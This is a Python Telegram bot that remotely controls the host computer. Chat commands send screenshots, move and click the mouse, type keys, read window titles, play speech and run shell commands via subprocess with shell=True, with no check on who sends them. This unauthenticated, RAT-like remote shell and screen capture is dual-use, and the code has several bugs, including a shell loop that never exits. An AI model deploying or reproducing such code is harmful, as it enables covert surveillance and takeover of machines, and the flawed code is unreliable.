from gtts import gTTS
from playsound import playsound
import telebot
import pyautogui
from PIL import Image, ImageDraw, ImageFont
import os
import subprocess as sp
api_key = open('api','r+').read()
bot = telebot.TeleBot(api_key)
osmode = False
@bot.message_handler(commands=['ss','screenshot'])
def test(message):
    pyautogui.screenshot('ss.png')
    bot.send_photo(message.chat.id, open('ss.png', 'rb'))

@bot.message_handler(commands=['mp','mouseposition'])
def mp(message):
    pyautogui.screenshot('ss.png')
    ssimage = Image.open('ss.png')

    xpos = pyautogui.position()[0]
    ypos = pyautogui.position()[1]

    draw = ImageDraw.Draw(ssimage)

    draw.rectangle((xpos, ypos, xpos + 20, ypos + 20), fill=True, outline='green', width=1)
    ssimage.save('ssout.png')
    bot.send_message(text=str(pyautogui.position()),chat_id=message.chat.id)
    bot.send_photo(message.chat.id, open('ssout.png','rb'))

@bot.message_handler(commands=['moveTo','moveto'])
def ptmove(message):
    print(message.text)
    msg = message.text
    try:
        ml = msg.split(' ')
        x = int(ml[1])
        y = int(ml[2])
        pyautogui.moveTo(x,y)
    except:
        bot.send_message(text="usage: /moveTo x y")
@bot.message_handler(commands=['move','move'])
def ptmove(message):
    print(message.text)
    msg = message.text
    try:
        ml = msg.split(' ')
        x = int(ml[1])
        y = int(ml[2])
        pyautogui.move(x,y)
    except:
        bot.send_message(text="usage: /move x y")

@bot.message_handler(commands=['os','cmd','shell'])
def oscmd(message):
    msg = message.text
    bot.send_message(text="Shell:",chat_id=message.chat.id)
    while msg != "exit":
        if msg == "/os" or msg == "/cmd" or msg == "/shell":
            pass
        else:
            @bot.message_handler()
            def oscmdmode(message):
                outpt = sp.check_output(msg,shell=True)
                bot.reply_to(message=message,text=outpt)
    bot.send_message(text="Exiting shell...",chat_id=message.chat.id)
    
@bot.message_handler(commands=['type'])
def ptwrite(message):
    inpt = str(message.text).split('/type ')[1]
    pyautogui.typewrite(inpt)

@bot.message_handler(commands=['press'])
def ptpress(message):
    inpt = str(message.text).split('/press ')[1]
    pyautogui.press(inpt)

@bot.message_handler(commands=['titles'])
def getttl(message):
    bot.send_message(text=str(pyautogui.getAllTitles()),chat_id=message.chat.id)


@bot.message_handler(commands=['click','c'])
def ptclick(message):
    if message.text == "/click":
        pyautogui.click()
    else:
        tinp = message.text.split(' ')
        x = tinp[1]
        y = tinp[2]
        pyautogui.click(x,y)

@bot.message_handler(commands=['lclick','lc'])
def ptclick(message):
    if message.text == "/lclick":
        pyautogui.leftClick()
    else:
        tinp = message.text.split(' ')
        x = tinp[1]
        y = tinp[2]
        pyautogui.leftClick(x,y)

 
@bot.message_handler(commands=['talk','tts'])
def recaud(message):
    mytext = str(message.text).split(f"{message.text.split(' ')[0]}")[1]
    filename = f'ttss.mp3'
    language = 'en'
    myobj = gTTS(text=mytext, lang=language, slow=False)
    myobj.save(filename)
    bot.send_message(text=mytext,chat_id=message.chat.id)
    playsound(filename)
    #os.system(f'start {filename}')
    bot.send_audio(chat_id=message.chat.id, audio=open(filename, 'rb'))
 
@bot.message_handler(commands=['doubleclick','dc'])
def ptdclick(message):
    if message.text == "/doubleclick":
        pyautogui.doubleclick()
    else:
        tinp = message.text.split(' ')
        x = tinp[1]
        y = tinp[2]
        pyautogui.doubleClick(x,y)

print('Bot Started')
bot.polling(non_stop=True)